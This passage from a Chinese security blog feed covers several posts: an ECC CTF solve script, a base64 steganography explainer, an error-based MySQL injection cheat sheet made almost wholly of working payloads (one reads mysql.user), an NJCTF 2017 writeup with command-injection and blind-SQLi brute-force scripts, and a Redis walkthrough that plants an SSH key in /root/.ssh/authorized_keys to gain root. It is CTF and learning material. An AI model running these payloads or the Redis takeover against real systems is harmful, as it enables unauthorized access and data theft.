</span><br><span class="line">    <span class="comment">#r0-r1</span></span><br><span class="line">    r0r1 = <span class="number">419665</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#K(r[0]-r[1]) </span></span><br><span class="line">    kr0r1 = curve.multiply(K,r0r1)</span><br><span class="line">    kr0r1f = Point(kr0r1.x,(-kr0r1.y)%p)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Kr1</span></span><br><span class="line">    kr1 = curve.add(c3,c1f)</span><br><span class="line">    kr1f = Point(kr1.x,(-kr1.y)%p)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#C1 - K*r[1]</span></span><br><span class="line">    c1kr1 = curve.add(c1,kr1f)</span><br><span class="line">    <span class="comment">#c1kr1f = Point()</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c1kr1 = (0x%x, 0x%x)'</span> % (c1kr1.x,c1kr1.y)</span><br><span class="line">    <span class="comment"># M = c1kr1 - kr0r1</span></span><br><span class="line">    M = curve.add(c1kr1,kr0r1f)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'M = (0x%x, 0x%x)'</span> % (M.x,M.y)</span><br><span class="line"></span><br><span class="line">    flag = hex(M.x ^ cipher)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n\n"</span></span><br><span class="line">    <span class="keyword">print</span> str(flag[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><p>最后得到flag</p><p>flag{7ed9f9fd31b8c78745ba49ebbec1b216}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该题目考查了ECC的公式推导，对于点乘和加法可以使用提供的方法实现，没有太大难度，这道题我没有利用上r[2]，对于爆破部分，也可以采用abs(r[2]-r[1]-r[0])来降低爆破数量。</p><p>参考链接:</p><p><a href="http://www.cnblogs.com/Kalafinaian/p/7392505.html" target="_blank" rel="noopener">ECC椭圆曲线详解</a></p><p><a href="http://www.pengshuo.me/2014/04/22/openssl%E7%BC%96%E7%A8%8B-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/" target="_blank" rel="noopener">OPENSSL编程 第二十章 椭圆曲线</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redhat-CTF中Advanced-ECC-分析&quot;&gt;&lt;a href=&quot;#Redhat-CTF中Advanced-ECC-分析&quot; class=&quot;headerlink&quot; title=&quot;Redhat CTF中Advanced ECC 分析&quot;&gt;&lt;/a&gt;Redhat C
      
    
    </summary>
    
    
      <category term="CTF Crypto" scheme="http://yoursite.com/tags/CTF-Crypto/"/>
    
  </entry>
  
  <entry>
    <title>浅析base64编码与base64隐写</title>
    <link href="http://yoursite.com/2018/04/17/%E6%B5%85%E6%9E%90base64%E7%BC%96%E7%A0%81%E4%B8%8Ebase64%E9%9A%90%E5%86%99/"/>
    <id>http://yoursite.com/2018/04/17/浅析base64编码与base64隐写/</id>
    <published>2018-04-17T03:00:39.000Z</published>
    <updated>2018-04-17T03:18:38.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0X01-编码"><a href="#0X01-编码" class="headerlink" title="0X01 编码"></a>0X01 编码</h1><hr><h3 id="何为base64编码"><a href="#何为base64编码" class="headerlink" title="何为base64编码"></a>何为base64编码</h3><p>From Wiki:</p><p>Base64是一种基于<code>64</code>个可打印字符来表示<code>二进制数据</code>的表示方法。由于2的6次方等于64，所以<code>每6个比特为一个单元</code>，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有<code>62</code>个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后binhex的版本使用不同的64字符集来代表6个二进制数字，但是它们不叫Base64。</p><p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email、在XML中存储复杂数据。</p><h3 id="base64编码实例"><a href="#base64编码实例" class="headerlink" title="base64编码实例"></a>base64编码实例</h3><p><img src="http://i1.piimg.com/588293/6c86a8c299939b1f.png" alt="Man的编码"></p><p>在这个例子中,”Man”三个字符被<code>base64</code>算法编码为四个字符。</p><p>第一步，”M”、”a”、”n”的ASCII值分别是77、97、110，对应的二进制值是01001101、01100001、01101110，将它们连成一个24位的二进制字符串010011010110000101101110。<br>第二步，将这个24位的二进制字符串分成4组，每组6个二进制位：010011、010110、000101、101110。<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节：00010011、00010110、00000101、00101110。它们的十进制值分别是19、22、5、46。<br>第四步，根据下表，得到每个值对应Base64编码，即T、W、F、u。</p><ul><li>Base64索引表:</li></ul><p><img src="http://i1.piimg.com/588293/353fc6c3512865e1.png" alt="base64索引表"></p><ul><li><strong>字节数不足3时</strong>，这样处理:</li></ul><p>如果要编码的字节数不能被3整除，最后会多出<code>1个或2</code>个字节，那么可以使用下面的方法进行处理：先使用0字节值在<code>末尾</code>补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个’=’号，代表补足的字节数。也就是说，当最后剩余<code>一个八位字节</code>（一个byte）时，最后一个6位的base64字节块有<code>四位是0值</code>，最后<code>附加上两个等号</code>;如果最后<code>剩余两个八位字节</code>（2个byte）时，最后一个6位的base字节块有<code>两位是0值</code>，最后<code>附加一个等号</code>。参考下表：<br><img src="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png" alt="base64"></p><h1 id="0x02-隐写"><a href="#0x02-隐写" class="headerlink" title="0x02 隐写"></a>0x02 隐写</h1><hr><p>上面讲到了当字节数不足3时的处理方法，会在编码后的文本后加上一个或两个’=’，这里等号是可以隐藏信息的，这种隐写方式以前从未见过，上周的<code>NJCTF</code>中涉足后，颇为震惊，花了几个小时理解原理，在此附上。</p><h3 id="解码规则"><a href="#解码规则" class="headerlink" title="解码规则"></a>解码规则</h3><p>首先，我们需要了解base64解码的规则，首先检查base64语句后有多少个’=’，然后把字符串按照<code>4*6=24</code>个二进制位一组切分，删除<code>&#39;=&#39;个数*8</code>个bit,按照6个bit一组通过映射表转为字符。<br>如图:<img src="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png" alt="解码"></p><p>上图中加粗的’0’可以用作二进制隐写，这样既不影响原文的还原，也不影响padding的删除，唯一的影响，上图的QQ==中第二个Q会变化，QkM=的M会变化，所以base64可以用于隐写。<br>然后附上国外大牛的py脚本。</p><pre><code class="python">def get_base64_diff_value(s1, s2):base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'res = 0for i in xrange(len(s1)):if s1[i] != s2[i]:return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))return resdef solve_stego():with open('stego.txt', 'rb') as f:file_lines = f.readlines()bin_str = ''for line in file_lines:steg_line = line.replace('\n', '')norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '')diff = get_base64_diff_value(steg_line, norm_line)pads_num = steg_line.count('=')if diff:bin_str += bin(diff)[2:].zfill(pads_num * 2)else:bin_str += '0' * pads_num * 2res_str = ''for i in xrange(0, len(bin_str), 8):res_str += chr(int(bin_str[i:i+8], 2))print res_strsolve_stego()</code></pre><p>And:一个base64隐写栗子,请自行下载测试。<a href="http://shell-storm.org/repo/CTF/Olympic-2014/Find_da_Key/stego.txt" target="_blank" rel="noopener">stego.txt</a></p><p>引用：</p><ul><li><a href="http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html" target="_blank" rel="noopener">http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html</a></li><li><a href="https://tools.ietf.org/html/rfc4648" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4648</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0X01-编码&quot;&gt;&lt;a href=&quot;#0X01-编码&quot; class=&quot;headerlink&quot; title=&quot;0X01 编码&quot;&gt;&lt;/a&gt;0X01 编码&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&quot;何为base64编码&quot;&gt;&lt;a href=&quot;#何为base64编码&quot; class=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>报错注入总结</title>
    <link href="http://yoursite.com/2018/04/17/Error-Based-SQL%20Injection/"/>
    <id>http://yoursite.com/2018/04/17/Error-Based-SQL Injection/</id>
    <published>2018-04-17T02:36:18.000Z</published>
    <updated>2018-04-17T03:21:36.004Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1 floor()"></a>1 floor()</h2><hr><p>Example</p><p>Show Version()</p><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&pass=1</code></pre>Show Databases---<a id="more"></a><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3904 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1</code></pre>Show Tables<pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3210 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73716c69) LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1</code></pre>Show columns<pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 8575 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x75736572 AND table_schema=0x73716c69 LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1</code></pre>Show data<pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa'+and(select 1 from(select count(*),concat((select (select (select concat(0x7,name,0x7e,pass,0x7e) from sqli.`user` limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&pass=1</code></pre><h2 id="2-Extractvalue"><a href="#2-Extractvalue" class="headerlink" title="2 Extractvalue()"></a>2 Extractvalue()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(select user()))))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))))%23&pass=1</code></pre><p>….</p><h2 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,(select user()),0x73),1))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)),0x73),1))%23&pass=1</code></pre><p>…</p><h2 id="4-GeometryCollection"><a href="#4-GeometryCollection" class="headerlink" title="4 GeometryCollection()"></a>4 GeometryCollection()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="5-polygon"><a href="#5-polygon" class="headerlink" title="5 polygon()"></a>5 polygon()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="6-multipoint"><a href="#6-multipoint" class="headerlink" title="6 multipoint()"></a>6 multipoint()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="7-multilinestring"><a href="#7-multilinestring" class="headerlink" title="7 multilinestring()"></a>7 multilinestring()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="8-multipolygon"><a href="#8-multipolygon" class="headerlink" title="8 multipolygon()"></a>8 multipolygon()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="9-linestring"><a href="#9-linestring" class="headerlink" title="9 linestring()"></a>9 linestring()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from(select user())a)b))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1</code></pre><h2 id="10-NAME-CONST"><a href="#10-NAME-CONST" class="headerlink" title="10 NAME_CONST()"></a>10 NAME_CONST()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=111' and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)%23&pass=1</code></pre><h2 id="11-整数溢出"><a href="#11-整数溢出" class="headerlink" title="11 整数溢出"></a>11 整数溢出</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select version())a limit 1)>(select version()),2,2))%23&pass=1</code></pre><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select*from mysql.user limit 1)a limit 1)>(select*from mysql.user limit 0),2,2))%23&pass=1</code></pre><h2 id="12-EXP"><a href="#12-EXP" class="headerlink" title="12 EXP()"></a>12 EXP()</h2><hr><pre><code class="SQL">http://0.0.0.0:8001/test.php?name=a' and EXP(~(SELECT*FROM(SELECT version())a))%23&pass=1</code></pre><p><pre><code class="SQL"><a href="http://0.0.0.0:8001/test.php?name=a&#39;" target="_blank" rel="noopener">http://0.0.0.0:8001/test.php?name=a&#39;</a> and EXP(~(SELECT*FROM((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a))%23&amp;pass=1</code></pre><br>From InterNet</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h2 id=&quot;1-floor&quot;&gt;&lt;a href=&quot;#1-floor&quot; class=&quot;headerlink&quot; title=&quot;1 floor()&quot;&gt;&lt;/a&gt;1 floor()&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;Example&lt;/p&gt;
&lt;p&gt;Show Version()&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;SQL&quot;&gt;http://0.0.0.0:8001/test.php?name=aa&#39;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1&lt;/code&gt;&lt;/pre&gt;
Show Databases
---
    
    </summary>
    
    
      <category term="SQL injection" scheme="http://yoursite.com/tags/SQL-injection/"/>
    
  </entry>
  
  <entry>
    <title>NJCTF2017 writeup</title>
    <link href="http://yoursite.com/2018/04/17/NJCTF2017-writeup/"/>
    <id>http://yoursite.com/2018/04/17/NJCTF2017-writeup/</id>
    <published>2018-04-17T02:36:18.000Z</published>
    <updated>2018-04-17T03:14:31.870Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">XCTF_OJ练习网站</a><br>上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。</p><p>附上本人的解题思路（渣渣一枚，大佬勿喷）</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p><img src="http://linkboi.top/usr/uploads/2017/03/4290578751.png" alt="2017-03-16 下午12.14.55.png"></p><p>试了多次sql注入，都不行，偶然一次发现有字符长度限制，想到可能是注册时<code>拼接</code>到数据库时有长度限制</p><pre>payload:注册admin+n多空格+abc字符</pre>登陆时用admin和注册的密码，即可getflag.![2017-03-16 下午12.14.55.png][3]### Get Flag![屏幕快照 2017-03-16 下午12.34.53.png][4]`本地文件包含漏洞（LFI）`这道题首先想到能不能找上层目录的文件 *../flag.php* 之类，结果猜不到文件，想是否可以利用管道'|' `ls`一下 结果提示'too young too simple'  多次尝试发现'|'被过滤了，还有'*' 等等。#### 思路1：尝试过程中发现通配符：`?`没有被过滤,于是放到burpsuite里面跑一下看看有没有对应的文件,因为跑的周期太长，这道题又设置了延迟五秒，官方说是防止爆破，于是尝试其他方法。#### 思路2：尝试过程中发现&没有过滤，导致列目录贴上代码<pre><code class="python"># coding:utf8import requestsimport base64import reurl = "http://218.2.197.235:23725/hehe"s = requests.session()req = s.get(url)data = {'flag':"1&ls ../../../../../"}res = s.post(url, data)cont = res.contentrcont = "".join(re.findall('".*"',cont))[1:-1].split(",")[1]print(base64.b64decode(rcont))</code></pre>运行结果:![屏幕快照 2017-03-16 下午12.49.04.png][5]读到flag:<pre>Macboi:~ boi$ python /Users/boi/Desktop/py/getflag.py cat: images/1: No such file or directoryNJCTF{Simp13_Pyth0n_C0de_Inj3cti0n_a77ack}</pre><h3 id="Wallet-题目描述-钱包里面有flag"><a href="#Wallet-题目描述-钱包里面有flag" class="headerlink" title="Wallet 题目描述 钱包里面有flag"></a>Wallet 题目描述 钱包里面有flag</h3><p>首先在about页面读到</p><pre>Get Y0u Money?! authenticate admin cookies using hash.233333333:XD</pre>然后在admin页面看，没有登录猜测是改cookie,Burp看一下:![屏幕快照 2017-03-16 下午1.05.12.png][6]如图，auth和hsh这两个参数可疑，hsh应该是某个数的md5,auth根据题意，应该是提交一个hash，到这里做不下去了，大佬提示看下目录，扫出了www.zip，下载下来，压缩包有密码...官方提示弱口令，群里各种大佬直呼几十G字典跑不出来，口令有多弱，结束比赛后，被告知为`njctf2016` 解压后有php加密，[在线解密][7]后，查看源码:<pre><code class="php">require_once "db.php";$auth = 0;if (isset($_COOKIE["auth"])) {    $auth = $_COOKIE["auth"];    $hsh = $_COOKIE["hsh"];    if ($auth == $hsh) {        $auth = 0;    } else {        if (sha1((string) $hsh) == md5((string) $auth)) {            $auth = 1;        } else {            $auth = 0;        }    }} else {    $auth = 0;    $s = $auth;    setcookie("auth", $s);    setcookie("hsh", sha1((string) $s));}if ($auth) {    if (isset($_GET['query'])) {        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);        $qstr = SQLITE3::escapeString($_GET['query']);        $query = "SELECT amount FROM my_wallets WHERE id={$qstr}";        $result = $db->querySingle($query);        if (!$result === NULL) {            echo "Error - invalid query";        } else {            echo "Wallet contains: {$result}";        }    } else {        echo strip_tags(" html  head  title Admin Page /title  /head  body Welcome to the admin panel! br /  br /  form name='input' action='admin.php' method='get' Wallet ID:  input type='text' name='query'  input type='submit' value='Submit Query'  /form  /body  /html ");    }} else {    echo "Sorry, not authorized.";}</code></pre><p>重点在<code>sha1((string) $hsh) == md5((string) $auth)</code>这句话，于是猜测到0e开头的md5和一个hash值的弱类型判断，测试得到payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'QNKCDZO'</span>)==sha1(<span class="string">'aaroZmOk'</span>)</span><br></pre></td></tr></table></figure></p><p>成功登陆<br><img src="http://linkboi.top/usr/uploads/2017/03/2237024545.png" alt="屏幕快照 2017-03-16 下午1.25.20.png"></p><p>分析源码，发现是个sqlite的sql注入</p><p>SQLITE 没有像 MySQL 中那样包含所有数据库、表、列的 information_schema 库。事实上，对于它而言，没有库的概念，直接对象是表，但是它是有系统表的，即 <code>sqlite_master</code>,在表中可以查到之前的操作:<br><img src="http://i1.piimg.com/588293/1799fbf62baab25d.png" alt="sql"></p><p>最后 getflag:</p><p><img src="http://i1.piimg.com/588293/f19cf4b7ff042529.png" alt="请输入图片描述"></p><h3 id="Come-on"><a href="#Come-on" class="headerlink" title="Come_on"></a>Come_on</h3><p>一道<code>宽字节</code>盲注题，用到了mysql的<code>left</code>和<code>right</code>函数，此处先给出payload和脚本，我们再进行分析</p><pre>payload:if((select(right(left((select(flag)from(flag)),1),1)))=binary(0x4e),1,0)%23</pre><pre><code class="python"># coding=utf-8import requestsimport randomimport hashlibs = requests.Session()def get_flag():    url='http://218.2.197.235:23733/index.php?key=123%df%27||'    flag = ""    string = 'abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ1234567890\{\}_'    payload = "if((select(right(left((select(flag)from(flag)),{}),1)))=binary({}),1,0)%23"    for j in range(1,34):        for i in string:            r = get_data(url + payload.format(str(j), hex(ord(i))))            if "002265" in r:                #print url + payload.format(str(j), hex(ord(i)))                flag +=i                print flag                breakdef get_data(url):    r = s.get(url)    return r.textget_flag()</code></pre><p>首先，测试的时候发现union,’&gt;’,’&lt;’和大把的盲注函数都被过滤了，最后只剩下<code>left</code>和<code>right</code>，这里讲一下这两个函数的功能:</p><blockquote><p><code>LEFT</code>(str,len)<br>返回字符串str的最左面len个字符。<br>mysql&gt; select LEFT(‘foobarbar’, 5);<br>           -&gt; ‘fooba’<br>该函数是多字节可靠的。</p><p><code>RIGHT</code>(str,len)<br>返回字符串str的最右面len个字符。<br>mysql&gt; select RIGHT(‘foobarbar’, 4);<br>           -&gt; ‘rbar’<br>该函数是多字节可靠的。</p></blockquote><p>我们再来由内而外解释一下payload:</p><blockquote><ol><li>(select(flag)from(flag)) #从flag表中查flag字段</li><li>left((select(flag)from(flag)),<code>x</code>) #对于flag字段，从左至右选取x个字符</li><li>right(left((select(flag)from(flag)),<code>x</code>),1) #从右向左取x个字符的最后一个</li><li>if((select(right(left((select(flag)from(flag)),<code>x</code>),1)))=binary(<code>y</code>),1,0) #这里利用了<code>if判断</code>和<code>binary()</code>函数，类似于三元表达式，如果select的结果等于binary(y)得到的十六进制字符，则返回1，否则返回0</li></ol></blockquote><p>最后，脚本跑出flag:NJCTF{5H0W_M3_S0M3_sQ1i_TrICk5}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://oj.xctf.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XCTF_OJ练习网站&lt;/a&gt;&lt;br&gt;上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。&lt;/p&gt;
&lt;p&gt;附上本人的解题思路（渣渣一枚，大佬勿喷）&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问getshell</title>
    <link href="http://yoursite.com/2018/04/17/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B8%8ESSH%E9%85%8D%E5%90%88getshell/"/>
    <id>http://yoursite.com/2018/04/17/Redis未授权访问漏洞与SSH配合getshell/</id>
    <published>2018-04-17T02:36:18.000Z</published>
    <updated>2018-04-17T03:16:58.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><hr><h1 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h1><hr><p>何为Redis</p><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>一个比较老的漏洞了，但是目前来看仍然有一部分系统未升级，故可继续利用。部分redis绑定在0.0.0.0:6379，并且没有开启认证（Redis默认配置），如果没有采取相应的策略或防火墙规则，会导致Redis直接暴露在公网上，导致其他用户可以在非授权的情况下执行命令等等</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>整体的思路就是通过未授权的访问，配合写入我们的SSH公钥，来达到免密登录的目的，从而进行下一步任务。</p><p>详细如下:</p><p>首先在本地生成公私钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen –t rsa</span><br></pre></td></tr></table></figure><p>然后将公钥写入foo.txt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; foo.txt</span><br></pre></td></tr></table></figure></p><p>到这我们本地工作已经完成，接下来连接redis服务器，再写入我们的公钥就好了<br><img src="https://ooo.0o0.ooo/2017/05/21/59206d6613716.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.ssh $ cat foo.txt |redis-cli -h 1.2.3.4  -x set crackit</span><br><span class="line">OK</span><br><span class="line">.ssh $ redis-cli -h 1.2.3.4  </span><br><span class="line">1.2.3.4:6379&gt; config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">1.2.3.4:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">1.2.3.4:6379&gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">OK</span><br><span class="line">1.2.3.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><img src="https://ooo.0o0.ooo/2017/05/21/59206d66013f2.png" alt="image"></p><p>最后 我们连接一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh –i  id_rsa root@1.2.3.4</span><br></pre></td></tr></table></figure></p><h2 id="0x04-Redis未授权访问其他危害"><a href="#0x04-Redis未授权访问其他危害" class="headerlink" title="0x04 Redis未授权访问其他危害"></a>0x04 Redis未授权访问其他危害</h2><p>a)数据库信息泄露<br>b)代码执行 redis-cli eval “$(cat foo.txt)” 0 -h 1.2.3.4<br>c)敏感信息泄露 info</p><p>参考链接1.<a href="http://www.freebuf.com/vuls/85021.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/85021.html</a></p><p>顺便贴上一个不错的图床链接<a href="https://sm.ms/" target="_blank" rel="noopener">https://sm.ms/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis未授权访问&quot;&gt;&lt;a href=&quot;#Redis未授权访问&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问&quot;&gt;&lt;/a&gt;Redis未授权访问&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id=&quot;0x01-Redis&quot;&gt;&lt;a href=&quot;#0x01-R
      
    
    </summary>
    
    
      <category term="exp" scheme="http://yoursite.com/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>phpok1.4审计</title>
    <link href="http://yoursite.com/2018/04/17/phpok1-4%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2018/04/17/phpok1-4审计/</id>
    <published>2018-04-17T02:36:18.000Z</published>
    <updated>2018-04-17T02:54:47.405Z</updated>
    
